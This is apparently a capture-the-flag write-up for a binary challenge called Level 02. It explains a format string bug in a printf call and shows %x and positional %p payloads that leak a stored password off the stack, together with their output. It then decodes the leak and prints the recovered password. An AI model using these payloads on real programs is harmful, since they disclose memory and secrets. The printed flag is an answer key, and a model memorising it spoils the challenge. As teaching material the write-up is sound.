# LEVEL 02

## Vulnerability identification

### Format string vulnerability

Critical line:

```c
printf(local_78);
```

It should have been:

```c
printf("%s", local_78);
```

Consequence: by supplying format specifiers (`%x`, `%p`, `%s`, `%n`) in the username, an attacker can:

- read stack memory;
- access variables stored on the stack;
- or write to memory (with `%n`).

---

## Exploitation

### Step 1 — probing the stack with `%x`

Initial test:

```bash
Username: AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
Password: test
```

Example output (truncated):

```bash
AAAA ffffe500 0 78 2a2a2a2a 2a2a2a2a ffffe6f8 f7ff9a08 78252078 25207825 20782520
78252078 25207825 20782520 78252078 25207825 20782520 78252078 25207825 20782520
252078 0 34376848 61733951 574e6758 6e475873 664b394d feff00 41414141 ....
#                              string terminator ---> ^^^^^^ ^^^^^^^^ <--- our input
```

### Step 2 — analyze the values

Positionally you can see several words that correspond to the password bytes.

- 22: `34376848` — start of the password
- 23: `61733951`
- 24: `574e6758`
- 25: `6e475873`
- 26: `664b394d`
- 27: `feff00` — string terminator
- 28: `41414141` — our `AAAA` input

Observation: the password read from `.pass` is stored on the stack and is therefore leakable via the format-string vulnerability.

### Step 3 — use `%p` on 64-bit systems

Problem: on 64-bit systems `%x` prints 4 bytes (32-bit) while stack values are 8-byte pointers. Use `%p` to read 8 bytes at a time.

command:

```bash
echo "%22\$p %23\$p %24\$p %25\$p %26\$p" | ./level02
```

output:

```
0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d
```

And without the `0x`/leading formatting (clean hex):

```
756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d
```

---

## Decoding the password

You can decode the leaked values using a hex-to-bytes conversion, then swap endianness per 8-byte word.



Token found using CyberChef [(full manipulation)](https://gchq.github.io/CyberChef/#recipe=Swap_endianness('Hex',8,true)From_Hex('Space')&input=NzU2ZTUwNTIzNDM3Njg0OCA0NTQxNGEzNTYxNzMzOTUxIDM3N2E3MTQzNTc0ZTY3NTggMzU0YTM1Njg2ZTQ3NTg3MyA0ODMzNjc1MDY2NGIzOTRk): `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`
